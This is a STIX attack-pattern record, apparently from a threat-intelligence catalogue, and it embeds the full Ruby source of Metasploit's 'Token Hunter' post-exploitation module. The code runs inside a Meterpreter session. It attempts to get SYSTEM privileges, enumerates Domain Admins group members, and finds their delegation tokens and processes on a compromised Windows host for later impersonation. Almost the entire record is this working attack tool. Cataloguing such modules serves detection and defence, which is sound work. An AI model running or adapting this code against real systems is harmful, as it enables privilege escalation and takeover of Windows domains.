{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a1b616fc-0662-483f-913b-8d748863cc5b",
    "created": "2024-08-14T16:33:05.044028Z",
    "modified": "2024-08-14T16:33:05.044032Z",
    "name": "Windows Gather Enumerate Domain Admin Tokens (Token Hunter)",
    "description": " This module enumerates Domain Admin account processes and delegation tokens.  This module will first check if the session has sufficient privileges to replace process level tokens and adjust process quotas.  The SeAssignPrimaryTokenPrivilege privilege will not be assigned if the session has been elevated to SYSTEM. In that case try first migrating to another process that is running as SYSTEM.  'License' => MSF_LICENSE 'Platform' => ['win']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_tokens.rb",
            "external_id": "enum_tokens.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Enumerate Domain Admin Tokens (Token Hunter)',\n        'Description' => %q{\n          This module enumerates Domain Admin account processes and delegation tokens.\n\n          This module will first check if the session has sufficient privileges\n          to replace process level tokens and adjust process quotas.\n\n          The SeAssignPrimaryTokenPrivilege privilege will not be assigned if\n          the session has been elevated to SYSTEM. In that case try first\n          migrating to another process that is running as SYSTEM.\n        },\n        'License' => MSF_LICENSE,\n        'Platform' => ['win'],\n        'Author' => ['Joshua Abraham <jabra[at]rapid7.com>'],\n        'SessionTypes' => ['meterpreter'],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => []\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              incognito_list_tokens\n              priv_elevate_getsystem\n              stdapi_registry_open_key\n              stdapi_sys_config_getprivs\n              stdapi_sys_config_getuid\n              stdapi_sys_config_sysinfo\n              stdapi_sys_process_get_processes\n            ]\n          }\n        }\n      )\n    )\n    register_options([\n      OptBool.new('GETSYSTEM', [ true, 'Attempt to get SYSTEM privilege on the target host.', true])\n    ])\n  end\n\n  def get_system\n    print_status('Trying to get SYSTEM privilege')\n\n    results = session.priv.getsystem\n    if results[0]\n      print_status('Got SYSTEM privilege')\n      return\n    end\n\n    print_error('Could not obtain SYSTEM privilege')\n  rescue Rex::Post::Meterpreter::RequestError => e\n    print_error(\"Could not obtain SYSTEM privilege: #{e}\")\n  end\n\n  def priv_check\n    if is_system?\n      privs = session.sys.config.getprivs\n      return privs.include?('SeAssignPrimaryTokenPrivilege') && privs.include?('SeIncreaseQuotaPrivilege')\n    end\n\n    is_admin?\n  end\n\n  def run\n    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']\n    print_status(\"Running module against #{hostname} (#{session.session_host})\")\n\n    fail_with(Failure::Unknown, \"Failed to load incognito on #{session.sid} / #{session.session_host}\") unless session.incognito\n\n    get_system if datastore['GETSYSTEM'] && !is_system?\n\n    fail_with(Failure::NoAccess, 'Aborted! Insufficient privileges.') unless priv_check\n\n    domain = get_domain_name\n\n    fail_with(Failure::Unknown, 'Could not retrieve domain name. Is the host part of a domain?') unless domain\n\n    netbios_domain_name = domain.split('.').first.upcase\n\n    domain_admins = get_members_from_group('Domain Admins', domain) || []\n\n    fail_with(Failure::Unknown, \"Could not retrieve '#{domain}\\\\Domain Admins' group members.\") if domain_admins.blank?\n\n    processes = client.sys.process.processes\n\n    fail_with(Failure::Unknown, 'Could not retrieve system processes.') if processes.blank?\n\n    user_tokens = session.incognito.incognito_list_tokens(0)\n    user_delegation = user_tokens['delegation'].split(\"\\n\")\n\n    domain_admins.each do |da_user|\n      tbl_pids = Rex::Text::Table.new(\n        'Header' => \"#{da_user} Domain Admin Token PIDs\",\n        'Indent' => 1,\n        'Columns' => ['Session', 'Host', 'User', 'PID']\n      )\n\n      user_delegation.each do |dt|\n        next unless dt.include?(netbios_domain_name)\n\n        ndom, nusr = dt.split('\\\\')\n\n        next unless ndom == netbios_domain_name && da_user == nusr\n\n        print_good(\"Found token for session #{session.sid} (#{session.session_host}) - #{da_user} (Delegation Token)\")\n      end\n\n      processes.each do |p|\n        next unless p['user'] == \"#{netbios_domain_name}\\\\#{da_user}\"\n\n        pid = p['pid']\n        tbl_pids << [session.sid, peer, da_user, pid]\n        print_good(\"Found process on session #{session.sid} (#{session.session_host}) - #{da_user} (PID: #{pid}) (#{p['name']})\")\n      end\n\n      if tbl_pids.rows.empty?\n        print_status(\"Found no processes on session #{session.sid} (#{session.session_host}) - #{da_user}\")\n        next\n      end\n\n      next unless session.framework.db.active\n\n      report_note(\n        host: session.session_host,\n        type: 'pid',\n        data: tbl_pids.to_csv\n      )\n    end\n  end\nend\n"
}